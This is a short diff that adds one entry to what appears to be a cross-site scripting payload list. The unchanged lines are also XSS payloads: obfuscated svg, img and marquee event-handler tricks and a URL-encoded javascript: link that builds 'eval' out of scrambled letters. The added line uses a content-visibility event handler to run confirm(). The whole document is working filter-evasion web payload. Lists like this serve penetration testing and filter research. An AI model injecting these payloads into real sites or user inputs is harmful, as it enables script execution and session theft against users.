@@ -2,6 +2,7 @@
 <svg/onload=parent[/al/.source+/ert/.source](1)>
 <svg/onload=parent[/al/.source.concat(/ert/.scource)](2)>
 <img/src=x onError​="`${x}`;alert(`XSS`);">
+"/hrefd=(1%0a%0aoncontentvisibilityautostatechange=confirm(/A00N/)%0d%0astyle=content-visibility:auto⁣
 <marquee+loop=1+width=0+onfinish='new+Function`al\ert`1``'>
 <img+border%3d3+alt%3djaVasCript%3a%2f*-
 %3ca%2fhref%3d%22j%0A%0Davascript%3a%7bvar%7b3%3as,2%3ah,5%3aa,0%3av,4%3an,1%3ae%7d%3d'earltv'%7d[self][0][v%2ba%2be%2bs](e%2bs%2bv%2bh%2bn)(document.domain)%22%20%2f%3eclick
